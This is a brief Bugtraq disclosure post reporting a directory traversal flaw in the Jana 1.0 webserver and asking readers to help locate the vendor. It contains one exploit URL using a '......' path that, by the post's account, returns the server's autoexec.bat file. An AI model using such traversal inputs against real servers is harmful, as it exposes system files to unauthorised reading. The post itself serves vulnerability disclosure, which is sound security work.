Bugtraq,

I have found a security flaw in Jana 1.0 webserver. I have not been able to find out \
any information on who makes this product nor a place to download the web server \
package. This webserver seems to be included as a suite of Internet services, one of \
witch I think is web-based chat. Enclosed is one exploit I have found in the limited \
time that I have had to deal with this web server. I am posting this information now \
so that one of you might know who makes this software and how I might be able to get \
in touch with them for further testing.

.
[root@foo whis]# telnet x.x.x.x 80
Trying x.x.x.x...
Connected to x.x.x.x.
Escape character is '^]'.

[root@foo whis]#

<http://server/....../autoexec.bat>

Prints user's autoexec.bat

I would like to say thank you to rain.forest.puppy. for all his help.
